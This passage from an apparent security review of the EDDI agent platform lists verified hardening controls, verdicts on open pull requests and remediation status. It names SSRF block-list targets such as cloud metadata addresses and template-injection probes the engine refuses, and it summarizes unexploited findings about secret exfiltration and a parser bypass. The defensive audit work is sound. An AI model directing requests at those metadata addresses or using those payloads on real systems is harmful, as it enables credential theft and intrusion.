- **Authorization:** every JAX-RS method has an explicit role or `@PermitAll`; `deny-unannotated-endpoints` holds; every MCP `@Tool` has `requireAnyRole`; tiers match `docs/security.md` and `McpRoles`; 1:1 conversation ownership fails closed on REST and MCP (say, stream, rerun, undo/redo, state, log, raw, tool history, attachments, audit, preview); `RestAgentManagement` `{userId}` binding complete; `ClientContextGuard` strips reserved keys; A2A USE check and principal-scoped tasks; HITL owner/admin/approver strict, approver cannot cancel executing turns, `decidedBy` from principal, Slack decisions bound to the integration; user memory/properties `{userId}`/`entryId` all through `validateUserAccess`; workspaces: typed stores, descriptor store, sharing (OWN), transfer (admin), export (VIEW + random token), import (owner stripped), deploy (EDIT + `SpaceReferenceGuard`), `X-EDDI-Space` membership filter; schedules bind userId and reject HITL-timeout/cadence forgery; `/secretstore` admin-only plus `authenticated` policy.
- **Secrets and crypto:** AES-256-GCM, 12-byte random IV, 128-bit tag; PBKDF2-HMAC-SHA256 600k with persisted per-deployment salt; row-binding AAD; KEK check value; rollback-safe rotation; keyed checksums nulled in responses; no plaintext in any `/secretstore` response or log; `SecretResolver` fails closed; `ConfigReferenceGuard` blocks runtime-data references; `VaultGrantChecker` follows `${connection:}`/`${vars:}`; `${caller:token}` same-origin and admin-authored; no weak primitives, no trust-all TLS, no hard-coded keys.
- **Attachments:** `Content-Disposition: attachment` + `nosniff`, MIME signature validation, random storage refs, cross-conversation access denied unless granted, size and quota checks before buffering.
- **Audit/GDPR:** v5 HMAC chain with key ids, admin-only reads, erasure covers memories, 1:1 attachments, dead letters, HITL journal, descriptors, checkpoints, auto-vaulted slots, snapshots, mappings, group transcripts, artifacts, schedules, OAuth state, A2A tasks, directory and notifications.
- **OAuth connections:** single-use state with browser-binding cookie, allow-listed `returnTo`, principal from the state row, tokens encrypted per row.
- **Slack:** HMAC with 5-minute window and constant-time compare. **`/v1`:** `MessageDigest.isEqual`, `openwebui:` namespacing, role gate in OIDC mode, startup guard.
- **UIs:** tokens in memory only (keycloak-js state / `api-client` header; SSE via `BearerEventSource`, never a URL); no `postMessage` listener in the Manager; chat `tokenOrigin` exact-origin allow-list, `event.source === window.parent`, never posts to `*`; `/manage/__auth_config__.js` escaped and served as an external script; the three `dangerouslySetInnerHTML` sinks escape first; `ReactMarkdown` without `rehypeRaw` everywhere else, `rehype-sanitize` defaults in the chat; React 19 blocks `javascript:` hrefs; no `eval`/`new Function`/`document.write`; MSW excluded from the jar and DEV-gated; operator allow-list enforced server-side (`setup-api` `endpoints` filter), tool args percent-encoded, non-GET calls HITL-gated.
- **Injection and parsers:** all 20 `processTemplate` call sites render config-authored strings only (sub-agent prompts and the setup summary go through `unparsedBlock`; `OutputTemplateTask` skips verbatim data; the LLM reply is a plain `String`); the restricted engine (executed against `target/classes` + qute-core) renders empty or errors for `{x.class}`, `{x.getClass}`, `inject:`, `cdi:`, `config:`, `config:property(..)`, `str:eval`, `global:`, `msg:`, `#eval`, `#include`, `#insert`, `#fragment`, `#cache`, user tags; nested and single `1e9` loops throw `TemplateLimitExceededException`; `PropertyAccessValueResolver` reads getters/fields only with type and package blocklists; the preview endpoint is editor/admin, owner-guards a conversation id, redacts snippets, never resolves `${vault:}`/`${connection:}`/`${caller:}`; `ConfigReferenceGuard` is a superset of the resolver patterns and enforced for httpcalls, LLM builder parameters and the tool loop; every Postgres SQL string uses constants or `?` binds (`sanitizeJsonPath`, `escapeLike`, `isPlainPgIdentifier` for pgvector tables); Mongo has no `$where`, every `Filters.regex` input is escaped or `SAFE_ID`-validated, `Document.parse` sees only serialized config; ZIP import has entry/size/total/canonical-path/truncation checks and hex/UUID-only ids; `DocsService` and `RestManagerResource` traversal-safe; attachments never touch the filesystem; `OpenXmlPackage` byte-budgeted with DTD/external entities off; no default typing, `ObjectInputStream`, YAML, SpEL/MVEL/Groovy, `ScriptEngine` or `ProcessBuilder` anywhere; the only `@JsonTypeInfo` is `Id.NAME`; no shell/file/code-execution tools; `CalculatorTool` length-capped recursive descent; sub-agent tools enforce provider/model/delegation allow-lists, depth, per-task limits and USE checks; `LogSanitizer` + record-level filter neutralise CRLF; Vert.x validates header values (no header injection).
- **Container and CI:** both `FROM` lines digest-pinned, UID 185, root-owned app files, writable dirs only `/deployments/tmp` and `/opt/eddi`, internal docs pruned in a throwaway stage; workflows `contents: read` by default, every third-party action SHA-pinned, no `pull_request_target`, event data via `env:`, release gated on tag regex + ancestry + blocking Trivy + boot check, cosign keyless + SLSA provenance, Maven wrapper checksum, lockfiles committed, Dependabot on maven/npm/actions/docker; `auto-approve-copilot.yml` trusts OWNER/MEMBER only and has no checkout.
- **Helm:** no default credentials (`required`), secrets as 0400 files, `automountServiceAccountToken: false`, EDDI pod `restricted`-compliant, render-time refusals for OIDC-off-with-ingress and missing opt-ins, NATS auth on, NetworkPolicy egress mirrors the SSRF blocklist (off by default — L7).
- **2026-10-15 fixes re-verified:** templated httpCall hosts refused with protection off (`ApiCallExecutor.rejectTemplatedAuthority` — covers uppercase schemes, userinfo, `{` before `?`/`#`/`/`); the cloud-metadata refusal is applied on every path (`ApiCallExecutor.java:1206-1220`) — a literal `169.254.169.254` **is** refused; H2 above is a parser bypass of that check, not its absence; `allowed-hosts` lower-cases, folds the default port, fails closed on a trailing dot and never skips the metadata check; `CallerTokenAuthorPolicy` on every write path; A2A USE check; L9 ownership fixes; `PageBounds` live (`limit` ceiling 400); MCP transport `followRedirects(false)`; A2A `RedirectPolicy.NEVER` and same-origin card check.
- **Outbound facade and tools:** `UrlValidationUtils` blocks decimal/hex hosts, IPv4-mapped/compatible/NAT64/6to4/Teredo forms, `fd00:ec2::254`, `169.254.170.2`, the `localhost.` family, userinfo tricks, and fails closed on a null host under STRICT (executed); `OutboundHttp` validates per hop, resolves `Location` against the previous hop, caps hops at 5, strips `SENSITIVE_HEADERS` cross-origin with correct default-port/case handling, enforces one deadline across hops, drops redirect bodies after 64 KiB, never decompresses on the JDK path and caps decompressed bytes on Vert.x; WebScraper, PdfReader, Weather, WebSearch, AttachmentForwarder, `SafeHttpPageFetcher` and the web crawler all use STRICT/HOPS_ONLY with body caps; `OpenApiSpecFetcher` per-hop checked and swagger-parser `setSafelyResolveURL(true)` refuses `file:` and private-IP `$ref`s (executed); OAuth token client NEVER redirects, allow-listed https origin, 1 MiB cap; `CallerIdentityContext` bindings restored in `finally`, virtual-thread safe; `OriginMatcher` fails closed; `DocsService` normalises and containment-checks; `RestInterfaceFactory` loopback only; DNS rebinding is mitigated by the JDK positive cache (`use-async-dns=false`), not by pinning.

## Round two — direct re-read and open pull requests (same day)

A second pass by the coordinating reviewer alone, reading code rather than delegating, over the areas round one covered only by delegation, plus every open PR that adds or touches a security surface. `origin/main` was re-fetched and is still `4b83ffb8b`, so nothing below is stale.

### Main — re-read, confirmed sound

- `ClientContextGuard` strips the engine-reserved context keys (`groupId`, `groupConversationId`, `groupDepth`, `groupTranscript`, `dynamicAgentConfig`, `dynamicCreatedAgentIds`, `delegationDepth`) by prefix on REST, streaming and MCP; a chat client cannot steer memory visibility or delegation depth. `OwnershipValidator.validateAndResolveUserId` pins non-admins to their own principal and refuses a nameless caller.
- MCP: every memory tool runs `validateUserAccess`; writes are `ADMIN_ONLY`; conversation tools go through `ConversationAccessGuard.requireConversationOwner`; `create_conversation`/`chat_with_agent` apply `requireAgentUseAccess`; `read_agent_logs` without a conversation is admin-only; `list_conversations` is owner-filtered by the store. `create_resource`/`update_resource`/`delete_resource` call the **REST stores** (`getRestStore(IRestLlmStore.class).createLlm(…)` and siblings), so `CallerTokenAuthorPolicy`, the editor read-redaction and the workspace guard apply over MCP too.
- Schedules are Author-tier end to end (`fire`, `retry`, `dismiss` included). Access requests (`POST …/shares/requests`) are open to every role but only record a request; `share`, `revoke`, `visibility`, `space` need OWN and `owner` is admin-only. Slack binds a validly signed event to the integration that owns the channel and never trusts the payload `team_id`. A2A `tasks/get`/`tasks/cancel` are principal-scoped behind the USE check. HITL decisions are bound to a SHA-256 `argsDigest` of the pending call, so an approver cannot rewrite tool arguments.

### Open pull requests

| PR | Verdict | Notes |
|---|---|---|
| **#1079** fix(security): H1–H3 | Fixes are correct; one residual | `rejectCloudMetadataTarget` now fails closed on a null `URI` host and also checks the `java.net.URL` host; `requireNotMetadataHop` refuses a host-less hop; the fence stripper is string-based with the same semantics; `SetupSecretHosts` derives `allowedHosts` from the provider or the admin's `baseUrl` and `"*"` must be explicit; `discover-tools` refuses `${vault:}`/`${vars:}` in `X-Mcp-Authorization`; `ConversationRecallTool` caps `query` at 500. **Residual:** every secret vaulted before this change stays unrestricted and remains exfiltrable exactly as in H1. Needs a boot-time `[SECURITY]` WARN listing unrestricted secrets that an LLM/MCP config references, a Manager warning state, or a one-shot migration that narrows wizard-named secrets (`setup.<agent>.*`) to their provider's host. |
| **#1059** signed inbound webhook channel | Sound, two notes | New anonymous `POST /integrations/webhook/{id}` with its own `permit` rule (POST only). HMAC-SHA256 with constant-time compare; `eddi-v1` scheme carries a timestamp (5-minute window) and the replay key is the signature; body capped at 256 KB before parsing; integration id regex-checked; a `${vault:…}` `signingSecret` is resolved at integration load (`ChannelTargetRouter.resolvePlatformSecrets`) and the verifier's literal `${vault:` branch is a fail-closed safety net; the `inputTemplate` is author config rendered with the event as data; events run as the namespaced principal `webhook:<integrationId>`. **Notes:** (1) the `github` and `generic-hmac` schemes sign the body only, so a captured request replays after the 10-minute dedup window and across nodes if the dedup cache is node-local — document, and prefer `eddi-v1`; (2) `404` for an unknown id versus `401` for a bad signature is an existence oracle on 24-hex ids — harmless, but a uniform `401` costs nothing. |
| **#1062** openai-compatible provider | Sound | `baseUrl` is syntax-checked and run through `rejectCloudMetadataTarget` in the builder; private hosts are allowed by design (self-hosted vLLM/Ollama) and still subject to `OutboundTargetPolicy`/`allowed-hosts` when protection is on, and to the secret's `allowedHosts`. `customParameters` must be a JSON object. No new write path. |
| **#1057** W3C trace propagation | Sound, default worth a sentence | Adds `traceparent`/`tracestate` to every outbound call (httpCalls, facade, MCP) with `eddi.tracing.propagate-outbound=true` by default, and strips them on cross-origin redirects. Trace ids reach third-party APIs and LLM providers; that is what the standard does, but the default should be stated in `docs/security.md` next to `tracestate` (vendor-specific content). |
| **#1065** agent test harness | Sound | New stores and `/agenttests` are Author-tier; runs deploy to the `test` environment and converse as `agent-test:<run>:<case>:<rep>`; `ToolMockRegistry.interceptRuleCall` fires only for `AgentTestConversations.isTestUserId`, so production conversations cannot be mocked. Adds `agent-test:` to the reserved principal prefixes that L3 asks an augmentor to refuse. |
| **#1060** `member_tool_call` SSE event | Sound | The event carries agent id, display name and tool **name** only — no arguments, nothing to redact. |
| **#1055** turn round-trip reduction | Sound | `ConversationDescriptorMemo` is `@RequestScoped`; the ownership guard's descriptor read is memoised within one request only and dropped on change, so a stale ownership decision cannot cross requests. |
| **#1058** tenant cost metering | Sound | Charges go to `getDefaultTenantId()`; no client-supplied tenant. `RestTenantQuota` roles unchanged (admin). |
| **#1073** dependency refresh | No supply-chain change | No repository or plugin-repository additions, no `http://` sources. |
| **#976** `json-schema-validator` 1.5.9 → 3.0.8 | Check before merging | A major bump of the library behind M9.1 (`ArtifactValidators` `$ref` loading). Whatever 3.x does by default, M9.1's fix — explicit loaders that accept only inline and classpath schemas — should land first or together, so the behaviour does not depend on a library default. |
| **#529** scheduled ingestion (external, June) | Do not merge as-is | Stale against `main` (uses the retired `SafeHttpClient`). Adds a process-wide `UrlValidationUtils.setValidationEnabled(false)` static kill-switch to production code for an integration test's benefit; the existing injectable `HostResolver` is the right seam. Its crawler also derives scope from `URI.getHost()` of a config-supplied `startUrl` without the per-request checks the shipped `WebCrawl` has. |
| Dependabot (#1072, #1069, #1068, #1067, #1029, #1028, #1027, #1023, #1022, #929, #824, #823, #744, #716, #488, #430) | Routine | #716 bumps the `eclipse-temurin:25-jre` digest that `src/main/docker/Dockerfile.demo` still uses (the production Dockerfile is on UBI) — routine, not stale as first written here; #430 (Testcontainers 2.x) and #1029 (TypeScript 7) are breaking majors, not security. |
| Docs/refactor PRs (#1061, #1054, #1063, #1053, #567, #561–#552, #522) | No security surface | #1053 (production-sized defaults) and #522 (demo reset script, external) were skimmed for credentials and bind addresses; nothing found. |

## Remediation status (2026-10-18)

Every finding above has a fix on an open pull request, each reviewed by the coordinating reviewer before it was pushed and shipped under Auto-fix:

| PR | Branch | Closes | Notes |
|---|---|---|---|
| #1079 | `fix/security-review-2026-10-17-high` | H1, H2, H3 | Merge first; #1080, #1083 and #1094 touch neighbouring files |
| #1080 | `fix/security-review-2026-10-17-h1-leftovers` | H1 follow-ups (explicit `allowedHosts` on create under `enforce`) | Stacked on #1079; retarget to `main` after #1079 merges or CI never runs |
| #1081 | `fix/security-review-authz` | M2, M3, M5, L2, L3, L4 | Overlaps #1084 in `RestGroupConversation` |
| #1082 | `fix/security-review-ui` | L1, L5, M5 (UI) | — |
| #1083 | `fix/security-review-outbound-parsers` | M8, M9, M10, M11, L13 (partial), L14, L15, L16 | Overlaps #1079 (`UrlValidationUtils`, `HttpClientModule`) and #1094 (`SecretRedactionFilter`); Secret Scanning red on a historical fixture commit, clears on merge |
| #1084 | `fix/security-review-data-lifecycle` | M4, L9 | Overlaps #1081 |
| #1088 | `fix/security-review-runtime` | M6, M7, L7 (part), L8 (part), L12, L13 | Codacy reports a stale "empty catch" anchored to a line that no longer holds one; not a required check |
| #1094 | `fix/security-review-secrets-redaction` | M1, H1 residual, L6, L10, L11 | Overlaps #1079/#1080 (vault files) and #1083; Secret Scanning red on a historical fixture commit, clears on merge |

Deliberately left for later, as the PRs' descriptions state: Keycloak `start-dev` and the `admin/admin` compose fallback, MongoDB root credentials, plaintext intra-service traffic, NATS/MongoDB authentication in the kustomize quickstart, installer self-verification and a cosign signature on `SHA256SUMS`, the MCP transport and Azure/Jlama response caps (L13), the "unverified / open" items below.

## Not verified / open

- H2 was proven at the parser level (guard vs client) and against the shipped Vert.x bytecode, not against a live metadata service; M9.1/M9.2, M10's OOM, M11 and L14 rest on the reviewers' harnesses against `target/classes` and were not run against the deployed image.
- ObjectId guessability (M3 precondition), Keycloak username character policy (L3), existence of unowned group-conversation records (L2), whether `AuditEntry.llmDetail` carries the full system prompt (would let MCP `eddi-viewer` read a USE-only agent's prompt from its own audit trail), MCP transport session binding, Postgres `authorize` parity for attachments, and M8's rebinding were traced in code but not exercised.
